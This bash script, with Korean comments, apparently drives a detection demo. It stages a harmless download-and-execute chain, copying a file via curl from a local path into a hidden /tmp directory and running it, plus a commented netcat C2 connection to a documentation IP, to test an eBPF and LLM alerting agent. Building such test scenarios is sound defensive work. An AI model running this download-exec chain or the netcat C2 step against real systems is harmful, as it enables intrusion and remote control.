#!/usr/bin/env bash
#
# 시나리오 1 — 의심스러운 execve 체인 (다운로드→실행, Living-off-the-Land)
#
#   bash(이 스크립트) ─┬─ mktemp                       스테이징 디렉토리        → drop
#                     ├─ curl file://…/payload.sh     페이로드 "다운로드"       → LLM 의심 / 다운로더로 기억
#                     ├─ chmod +x                                              → drop
#                     └─ /tmp/.cache-XXXX/sysupdate   임시경로 실행            → rule High
#                          │                            + 같은 부모에서 curl 직후 → download-exec-chain Critical
#                          ├─ id                       정찰                   → drop
#                          └─ nc 198.51.100.7 4444     C2 접속 시도             → rule High (nc) + rule Medium (connect)
#
# 전부 무해: curl 은 file:// 로 로컬 파일을 복사할 뿐이고, 198.51.100.7 은 문서용 예약 대역이다.
#
# 실행:  scripts/scenario-1-exec-chain.sh           # agent 에 cap_bpf 있으면 실 eBPF, 아니면 재생
#        MODE=replay scripts/scenario-1-exec-chain.sh
set -euo pipefail
REPO="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
# shellcheck source=lib/demo-common.sh
source "$REPO/scripts/lib/demo-common.sh"

demo_init "scenario-1-exec-chain"
demo_start_analyzer

if [[ "$AGENT_MODE" == "ebpf" ]]; then
  demo_start_agent_ebpf
  echo "== [4] 공격 체인 실행 (실제 프로세스 — 전부 무해) =="
  STAGE="$(mktemp -d /tmp/.cache-XXXXXX)"
  curl -s -o "$STAGE/sysupdate" "file://$REPO/scenarios/payload.sh"   # "다운로드"
  chmod +x "$STAGE/sysupdate"
  "$STAGE/sysupdate"                                                    # 임시경로 실행
  rm -rf "$STAGE"
  demo_stop_agent
else
  demo_run_replay "$REPO/scenarios/exec-chain.events"
fi

demo_finish
